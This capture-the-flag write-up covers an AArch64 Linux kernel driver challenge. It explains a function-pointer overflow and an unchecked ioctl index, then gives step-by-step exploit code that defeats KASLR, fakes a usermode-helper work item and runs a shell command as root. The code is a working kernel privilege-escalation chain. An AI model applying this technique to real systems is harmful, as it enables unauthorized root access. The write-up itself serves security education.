# menfess

**Category:** Pwn · Linux Kernel (AArch64) · **Points:** 500 · **Solves at capture:** 0 · **Flag:** `COMPFEST18{JUs7_Simpl3_k3rn3l_pwn_83ff046e01ea03c8f9ebf59e}`

---

## Challenge Description

> Try out our new menfess device!

The attachment is a complete QEMU boot environment: a Linux kernel image, an initramfs, and a loadable kernel module (`menfess.ko`) that exposes `/dev/menfess`. The shell drops to UID 1000 with KASLR enabled. The flag sits at `/flag.txt`, which is a symlink to a protected block device (`/dev/vda`).

```text
Image                 ARM64 Linux kernel image
initramfs.cpio.gz     Initial filesystem (drops to UID 1000)
menfess.ko            Vulnerable kernel module
src/menfess.c         Module source
debug/System.map      Pre-KASLR kernel symbol offsets
run.sh                Local QEMU launcher
```

The kernel is booted with:

```sh
-append "console=ttyAMA0 kaslr oops=panic panic=-1 quiet"
```

KASLR randomizes both the kernel image base and each module independently. Oops-on-panic with no reboot means a crash ends the session — there are no second chances once we corrupt the wrong thing.

---

## Initial Analysis

### The `/dev/menfess` driver

The module implements a simple anonymous-messaging device. Each message is stored in one of eight global slots:

```c
static struct Menfess *menfess_list[8];
```

Every slot holds a `kmalloc`-allocated object:

```c
#define MENFESS_SIZE 64

struct Menfess {
    char content[MENFESS_SIZE];   /* +0x00 — 64 bytes of message text */
    void (*send_func)(char *);    /* +0x40 — 8-byte function pointer  */
};                                /* +0x48 — total 72 bytes           */
```

The object lands in the `kmalloc-96` slab (the next power-of-two bucket that fits 72 bytes).

### The ioctl interface

Three commands are exposed via `ioctl`:

| Command | Number | Action |
|---|---|---|
| `CMD_CREATE_MENFESS` | `0x1337` | Allocate a slot, copy user data in |
| `CMD_SEND_MENFESS`   | `0x1338` | Call `obj->send_func(obj->content)` |
| `CMD_VIEW_MENFESS`   | `0x1339` | Copy the object back to userspace |

The create request carries up to 72 bytes of caller-controlled data, a slot index, and a size field:

```c
struct create_req {
    unsigned long size;
    unsigned long index;
    char data[sizeof(struct Menfess)];  /* 72 bytes */
};
```

By default `send_func` is set to `default_func`, which just logs the message to the kernel ring buffer via `printk`.

---

## The Vulnerability / Core Concept

Two independent bugs combine to give full kernel code execution.

### Bug 1 — Off-by-layout overflow of the function pointer (CREATE)

The driver checks that `size` does not exceed the total object size, then copies into `obj->content`:

```c
if (req.size > sizeof(struct Menfess))   // allows size == 72
    return -EINVAL;

obj->send_func = default_func;           // set the function pointer first
memcpy(obj->content, req.data, req.size); // then overwrite up to 72 bytes
```

`obj->content` is only 64 bytes. When `size == 72`, the copy runs 8 bytes past the end of `content` and directly into `send_func`. The function pointer is silently overwritten with whatever the caller placed at bytes 64–71 of their request.

Sending the message then unconditionally dereferences it:

```c
obj->send_func(obj->content);  // x0 = obj->content on AArch64
```

This is arbitrary kernel-mode program-counter control, with `x0` (the first argument register on AArch64) pointing to the start of our heap object.

### Bug 2 — Missing bounds check in VIEW

`CMD_CREATE_MENFESS` and `CMD_SEND_MENFESS` both gate on `req.index >= MENFESS_COUNT`. `CMD_VIEW_MENFESS` does not:

```c
case CMD_VIEW_MENFESS: {
    struct view_req req;
    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
        return -EFAULT;

    // No bounds check on req.index!
    if (menfess_list[req.index] == NULL)   // oob read here
        return -EINVAL;

    struct Menfess *obj = menfess_list[req.index];
    if (copy_to_user(..., obj, sizeof(*obj)))
        return -EFAULT;
    ...
```

`menfess_list` is a static array of 8 pointers. The lookup is:

```
ptr = *(menfess_list + index * 8)
```

`index` is an unsigned 64-bit integer. Unsigned arithmetic wraps, so any aligned kernel address can be reached by choosing the right `index`. Whatever 8-byte value lives at that address is treated as a `struct Menfess *`, and the driver then copies 72 bytes from it back to userspace.

This is not a direct arbitrary read on its own — we need to know the target address before we can compute the right index. But combined with Bug 1 (which lets us call `_printk` with a format string we control), we can leak a heap address and use it to bootstrap the VIEW primitive into reading kernel code.

### Why they combine

- Bug 1 gives us a controlled call with `x0` pointing to our data — powerful, but we need a kernel address to jump to.
- Bug 2 lets us read 72 bytes of kernel memory from any aligned address we can compute — but we need to know a heap object address to anchor the index calculation.
- A single `_printk("%px")` call via Bug 1 yields both the heap address (from the format string output) and, after decoding the module's PLT trampoline through Bug 2, the kernel base.

---

## Exploitation

The full exploit is in `exploit.c`. Here is the chain step by step.

### Step 1 — Leak the module base via VIEW

Create a zero-length object. The driver sets `send_func = default_func` and copies nothing, so the pointer survives intact:

```c
struct create_req r = {.size = 0, .index = 0};
ioctl(devfd, CMD_CREATE_MENFESS, &r);
```

`VIEW` on slot 0 copies the object back. `default_func` is at offset 0 in the module's `.text` section, so the 8 bytes at offset 64 of the returned data are the loaded module base:

```c
view_obj(0, leak);
uint64_t modbase;
memcpy(&modbase, leak + 64, 8);
// [+] module base/default_func: 0xffffaac30f20b000
```

Known offsets inside the module (from `debug/System.map` and static analysis):

```
module + 0x0000  default_func / start of .text
module + 0x034c  _printk PLT trampoline
module + 0x2000  menfess_list (start of .bss)
```

### Step 2 — Heap leak via `_printk` format string

On AArch64, the ABI passes the first argument in `x0`. The SEND path looks roughly like:

```asm
ldr  x2, [x1, #64]   ; load send_func from *obj
mov  x0, x1           ; x0 = obj (first arg to send_func)
blr  x2               ; branch to send_func
```

Crucially, `x1` still holds the object pointer when `blr x2` fires. `_printk` treats `x0` as its format string and `x1` as the first variadic argument — which happens to be our object's address. `%px` prints it.

Build the object with the format string at offset 0, the `_printk` PLT address at offset 8 (for the upcoming VIEW step), the shell command strings packed in, and the PLT address overwriting `send_func` at offset 64:

```c
uint64_t printk_plt = modbase + 0x34c;

memcpy(d + 0,  "A:%px\n", 7);
memcpy(d + 8,  &printk_plt, 8);
memcpy(d + 16, "/bin/sh",  8);
memcpy(d + 24, "-c",       3);
memcpy(d + 32, "/bin/busybox chmod 4 /flag.txt", 31);
memcpy(d + 64, &printk_plt, 8);  // overwrites send_func
make_obj(0, d);
send_obj(0);

uint64_t storage = get_printed_ptr("A:");
// [+] string object: 0xffff0000046b05a0
```

The `get_printed_ptr` helper reads `/dev/kmsg` (the kernel message buffer) until it finds the `A:` marker.

### Step 3 — Decode the PLT to recover the kernel base

An ARM64 module PLT trampoline is two instructions:

```asm
adrp x16, <target_page>
add  x16, x16, <target_offset>
br   x16
```

We use Bug 2 to read those instructions. `menfess_list[evil_index]` should dereference to `storage + 8`, which holds `printk_plt`. The driver then copies 72 bytes starting from `printk_plt` — the live PLT instructions — back to userspace.

```c
uint64_t menfess_list_addr = modbase + 0x2000;
uint64_t evil_index = (storage + 8 - menfess_list_addr) / 8;
view_obj(evil_index, leak);

uint32_t adrp, add;
memcpy(&adrp, leak + 0, 4);
memcpy(&add,  leak + 4, 4);
uint64_t printk_addr = decode_adrp_add(printk_plt, adrp, add);
uint64_t kbase = printk_addr - 0x12b8c4;  // _printk offset from System.map
// [+] _printk:     0xffffaac36212b8c4
// [+] kernel base: 0xffffaac362000000
```

`decode_adrp_add` reconstructs the target address by sign-extending and combining the `adrp` and `add` immediates — standard ARM64 instruction decoding, see `exploit.c` for the bit manipulation.

KASLR is now fully defeated.

### Step 4 — Build a fake `subprocess_info` on the kernel heap

We cannot call `commit_creds(init_cred)` directly because the SEND path puts the object pointer in `x0`, not a credential pointer. Instead, we abuse the kernel's usermode-helper subsystem.

`struct subprocess_info` describes a program for the kernel to launch as root:

```
+0x00  embedded work_struct
  +0x00  data / flags
  +0x08  work_struct.entry.next
  +0x10  work_struct.entry.prev
  +0x18  work_struct.func  → call_usermodehelper_exec_work
+0x28  path  → kernel pointer to "/bin/sh"
+0x30  argv  → kernel pointer to argv[]
+0x38  envp  → NULL
+0x40  wait  → 0 (async)  ← also the menfess send_func field
```

We need all pointers to be kernel-resident (userspace pointers will be rejected). The string object allocated in Step 2 already holds `/bin/sh`, `-c`, and the command string packed in at offsets 16, 24, and 32. We allocate a second object for the `argv[]` array:

```c
// Argv object: B:%px\n format string to leak its address,
// then argv[0..2] pointing into the string object.
memcpy(d + 0,  "B:%px\n", 7);
p = storage + 16; memcpy(d + 16, &p, 8);  // argv[0] = "/bin/sh"
p = storage + 24; memcpy(d + 24, &p, 8);  // argv[1] = "-c"
p = storage + 32; memcpy(d + 32, &p, 8);  // argv[2] = command
memcpy(d + 64, &printk_plt, 8);
make_obj(1, d);
send_obj(1);
uint64_t argv_obj = get_printed_ptr("B:");
// [+] argv object: 0xffff0000046b0540
```

### Step 5 — Predict the work object address and queue it

`CONFIG_SLAB_FREELIST_RANDOM` and `CONFIG_SLAB_FREELIST_HARDENED` are both disabled. The `kmalloc-96` freelist allocates sequentially downward by `0x60` bytes per object. After leaking `argv_obj`, the next `kmalloc` will return `argv_obj - 0x60`:

```c
uint64_t work_obj = argv_obj - 0x60;
```

A `work_struct` requires its linked-list pointers to be self-referential on initialization:

```c
work->entry.next = &work->entry;
work->entry.prev = &work->entry;
```

Because we know `work_obj` before allocating it, we can pre-compute these. The final object layout:

```c
memset(d, 0, sizeof(d));
p = work_obj + 8; memcpy(d + 8,  &p, 8);  // entry.next = self
p = work_obj + 8; memcpy(d + 16, &p, 8);  // entry.prev = self
memcpy(d + 24, &umh_work,  8);             // work.func  = call_usermodehelper_exec_work
p = storage + 16; memcpy(d + 40, &p, 8);  // path = "/bin/sh"
p = argv_obj + 16; memcpy(d + 48, &p, 8); // argv = argv[]
// envp at d+56 stays NULL
memcpy(d + 64, &schedule_work, 8);         // send_func = kblockd_schedule_work
make_obj(2, d);
```

Sending slot 2 calls `kblockd_schedule_work(&work_obj->work_struct)`. The block workqueue runs with root kernel credentials, so when its worker thread invokes `call_usermodehelper_exec_work`, the spawned process inherits root and runs:

```sh
/bin/sh -c '/bin/busybox chmod 4 /flag.txt'
```

Mode `0004` sets the world-read bit. The exploit polls `open("/flag.txt", O_RDONLY)` until it succeeds, then reads and prints the flag.

---

## Key Commands / Payloads

Compile for AArch64 (statically linked so it runs inside the initramfs without library dependencies):

```sh
aarch64-linux-gnu-gcc -static -O2 -Wall -Wextra -o exploit exploit.c
```

Test locally — pack the exploit into a modified initramfs and boot with the provided launcher:

```sh
bash run.sh
```

Deploy remotely — `remote.py` connects to the challenge service, solves the proof-of-work (offloaded to a faster machine), uploads a gzip-compressed Base64-encoded exploit binary, and waits for flag output:

```sh
python3 remote.py REMOTE_HOST PORT
```

---

## Flag

```
COMPFEST18{JUs7_Simpl3_k3rn3l_pwn_83ff046e01ea03c8f9ebf59e}
```

Full remote output at capture:

```
[+] module base/default_func: 0xffffaac30f20b000
[+] string object: 0xffff0000046b05a0
[+] _printk: 0xffffaac36212b8c4
[+] kernel base: 0xffffaac362000000
[+] call_usermodehelper_exec_work: 0xffffaac3620cc090
[+] kblockd_schedule_work: 0xffffaac36257a454
[+] argv object: 0xffff0000046b0540
[+] predicted work object: 0xffff0000046b04e0
[*] helper launched; waiting for /flag.txt permissions...
[+] flag: COMPFEST18{JUs7_Simpl3_k3rn3l_pwn_83ff046e01ea03c8f9ebf59e}
```

---

## Key Takeaways

**The overflow pattern.** A function pointer placed immediately after a user-controlled buffer is dangerous whenever the allowed copy size reaches or exceeds the pointer's offset. The driver's check `size > sizeof(struct Menfess)` permits writing all 72 bytes, including the 8-byte `send_func`. This is the kind of boundary mistake that is easy to miss in a code review because the size check looks correct at a glance.

**Bounds checks must cover every path.** CREATE and SEND both validate `index < 8`. VIEW checks only for `NULL`. One omission turns a benign read into an out-of-bounds kernel memory disclosure.

**Module base and kernel base are separate.** KASLR randomizes each independently. Leaking `default_func` gives the module's load address. The module PLT trampoline for `_printk` encodes the real kernel address of that function in its `adrp`/`add` instruction pair. Decoding those two 32-bit words is the bridge between the two randomized regions.

**Kernel code execution does not automatically mean root.** A function called from `send_obj` runs with the credentials of the calling process (UID 1000). Reaching root requires either `commit_creds(init_cred)` — which needs `init_cred`'s kernel address and the right argument in `x0` — or reuse of an existing privileged execution context. Here we chose the usermode-helper workqueue because it is already designed to spawn processes as root and its data structure (`subprocess_info`) fits naturally inside a 72-byte menfess object.

**Predictable slab allocation as a primitive.** With `SLAB_FREELIST_RANDOM` disabled, `kmalloc-96` allocations are sequential and descending. Leaking one object's address makes the next allocation's address predictable, which is essential for pre-populating the self-referential `work_struct.entry` pointers before the object exists.

**The chain required six distinct steps.** No single bug was sufficient: function-pointer overwrite, heap leak via format string, out-of-bounds VIEW, PLT decoding, slab address prediction, and usermode-helper workqueue abuse all had to be chained in sequence. That layered dependency is what kept the solve count at zero.
